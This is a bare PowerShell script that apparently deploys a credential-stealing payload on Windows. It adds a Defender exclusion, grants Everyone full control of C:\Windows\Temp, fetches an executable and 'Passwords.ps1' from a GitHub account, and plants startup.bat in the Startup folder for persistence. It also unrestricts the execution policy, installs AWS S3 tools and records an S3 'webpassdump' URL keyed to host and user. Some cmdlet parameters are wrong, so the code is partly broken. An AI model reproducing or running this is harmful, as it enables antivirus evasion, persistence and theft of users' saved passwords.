Add-MpPreference -ExclusionPath “C:\Windows\Temp\JuansFamousFriedChicken”

$Folder = 'C:\Windows\Temp\JuansFamousFriedChicken'

"Test to see if folder [$Folder] exists"

if (Test-Path -Path $Folder) {

"Path exists!"

} else {

New-Item -path 'C:\Windows\Temp\JuansFamousFriedChicken' -ItemType Directory

"Path created."

}

$SharePath = "C:\Windows\Temp\JuansFamousFriedChicken\"
$Acl = Get-ACL $SharePath
$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","FullControl","ContainerInherit,Objectinherit","none","Allow")
$Acl.AddAccessRule($AccessRule)
Set-Acl $SharePath $Acl

$sharepath2 = "C:\Windows\Temp\"
$Acl2 = Get-ACL $sharepath2
$AccessRule2= New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","FullControl","ContainerInherit,Objectinherit","none","Allow")
$Acl2.AddAccessRule($AccessRule2)
Set-Acl $sharepath2 $Acl2

# check for Installer

$Software='C:\Windows\Temp\JuansFamousFriedChicken\RCTBrowserView.exe'

"Test to see if software exists"

if (Test-Path -path $software) {

"Software Exists"

} Else {

# Copy Zip to local machine

Copy-Item -Uri "https://github.com/DemonicDorx/temp/blob/main/RCTBrowserView.exe" -Outfile 'C:\Windows\Temp\JuansFamousFriedChicken\RCTBrowserView.exe' -force

Copy-Item -Uri 'https://github.com/DemonicDorx/temp/blob/main/startup.bat' -Outfile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.bat' -force

Copy-Item -Uri "https://github.com/DemonicDorx/temp/blob/main/Passwords.ps1" -Outfile 'C:\Windows\Temp\JuansFamousFriedChicken\Passwords.ps1' -force

"Software copied"

}
Set-ExecutionPolicy -ExecutionPolicy Unrestricted

Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force

Register-PackageSource -Name Nuget -Location "http://www.nuget.org/api/v2" –ProviderName Nuget -Trusted

Install-Module -Name AWS.Tools.S3 -Force

timeout 120

$user = $env:USERNAME
$hostname = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName" | Select-Object -ExpandProperty ComputerName
$File = $hostname + "-" + $user

REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\ITA /v Custom2 /t REG_SZ /d "https://rmmoutputs.s3.amazonaws.com/webpassdump/$File.html" /f
